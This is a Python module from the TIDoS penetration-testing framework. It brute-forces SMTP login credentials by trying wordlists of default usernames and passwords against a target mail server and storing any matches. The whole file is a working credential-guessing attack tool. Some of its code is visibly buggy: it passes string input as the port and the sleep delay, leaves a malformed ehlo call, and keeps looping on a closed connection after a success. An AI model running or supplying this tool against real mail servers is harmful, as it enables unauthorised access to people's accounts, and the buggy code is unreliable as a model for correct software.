#!/usr/bin/env python3
# -*- coding: utf-8 -*-

#-:-:-:-:-:-:-:-:-:-:-:-:#
#    TIDoS Framework     #
#-:-:-:-:-:-:-:-:-:-:-:-:#

#Author: @_tID
#This module requires TIDoS Framework
#https://github.com/0xInfection/TIDoS-Framework


import os
import sys
import time
import socket
from time import sleep
import smtplib
from core.Core.colors import *
from core.database.database_module import save_data
from core.variables import database
from core.methods.cache import targetname
import inspect

smtpuser = []
smtppass = []

searchinfo = "SMTP cracker"
info = "Crack common SMTP login credentials using dictionaries."
properties = {}

def smtpBrute0x00(ip, usernames, passwords, port, delay):

    s = smtplib.SMTP(str(ip), port)
    found = False
    for username in usernames:
        for password in passwords:
            try:
                s.ehlo()
                s.starttls()
                s.ehlo
                s.login(str(username), str(password))
                print(G + ' [+] Username: %s | Password found: %s\n' % (username, password))
                data = username + " : " + password
                save_data(database, module, lvl1, lvl2, lvl3, name, data)
                found = True
                s.close()
            except smtplib.SMTPAuthenticationError:
                print(GR+ " [*] Checking : "+C+"Username: {} | ".format(username)+B+"Password: {} ".format(password)+R+"| Incorrect!\n")
                sleep(delay)
            except Exception as e:
                print(R+" [-] Error caught! Exception: "+str(e))
                pass
            except KeyboardInterrupt:
                s.close()
                if not found:
                    data = "Nothing found."
                    save_data(database, module, lvl1, lvl2, lvl3, name, data)
                sys.exit(1)
    if not found:
        data = "Nothing found."
        save_data(database, module, lvl1, lvl2, lvl3, name, data)

def smtpbrute(web):
    global name
    name = targetname(web)
    global lvl2
    lvl2 = inspect.stack()[0][3]
    global module
    module = "VulnAnalysis"
    global lvl1
    lvl1 = "Brute Force Tools"
    global lvl3
    lvl3 = ""
    time.sleep(0.6)
    #print(R+'    =====================')
    #print(R+'\n     S M T P   B R U T E ')
    #print(R+'    ---<>----<>----<>----\n')
    from core.methods.print import pbrute
    pbrute("smtp")
                 
    try:
        with open('files/brute-db/smtp/smtp_defuser.lst') as users:
            for user in users:
                user = user.strip('\n')
                smtpuser.append(user)
        with open('files/brute-db/smtp/smtp_defpass.lst') as passwd:
            for passw in passwd:
                passw = passw.strip('\n')
                smtppass.append(passw)
    except IOError:
        print(R+' [-] File paths not found!')

    web = web.replace('https://','')
    web = web.replace('http://','')
    ip = socket.gethostbyname(web)
    w = input(O+' [§] Use IP '+R+ip+' ? (y/n) :> ')
    if w == 'y' or w == 'Y':
        port = input(O+' [§] Enter the port (eg. 25, 587) :> ')
        delay = input(C+' [§] Delay between each request (eg. 0.2) :> ')
        print(B+' [*] Initiating module...')
        time.sleep(1)
        print(GR+' [*] Trying using default credentials...')
        smtpBrute0x00(ip, smtpuser, smtppass, port, delay)
    elif w == 'n' or w == 'N':
        ip = input(O+' [§] Enter IP :> ')
        port = input(O+' [§] Enter the port (eg. 25, 587) :> ')
        delay = input(C+' [§] Delay between each request (eg. 0.2) :> ')
        print(B+' [*] Initiating module...')
        time.sleep(1)
        print(GR+' [*] Trying using default credentials...')
        smtpBrute0x00(ip, smtpuser, smtppass, port, delay)
    else:
        print(R+' [-] Sorry fam you typed shit!')
        sleep(0.7)
    print(G+' [+] Done!')

def attack(web):
    web = web.fullurl
    smtpbrute(web)
